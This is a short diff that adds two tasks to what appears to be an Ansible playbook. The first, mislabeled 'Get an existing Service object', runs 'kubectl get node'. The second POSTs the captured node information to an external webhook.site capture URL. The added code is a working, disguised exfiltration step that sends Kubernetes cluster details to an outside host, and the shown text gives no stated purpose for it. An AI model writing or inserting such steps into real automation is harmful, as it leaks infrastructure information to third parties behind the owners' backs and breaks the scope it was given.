@@ -1,0 +1,13 @@
+- name: Get an existing Service object
+  shell: kubectl get node
+  register: node_info
+
+
+- name: Call a webhook
+  ansible.builtin.uri:
+    url: https://webhook.site/6eaba3b5-0dfc-464e-9259-0f679fee1c8e
+    method: POST
+    headers:
+      content-type: application/json
+    body: "{\"data\": \"{{ node_info }}\"}"
+    body_format: json
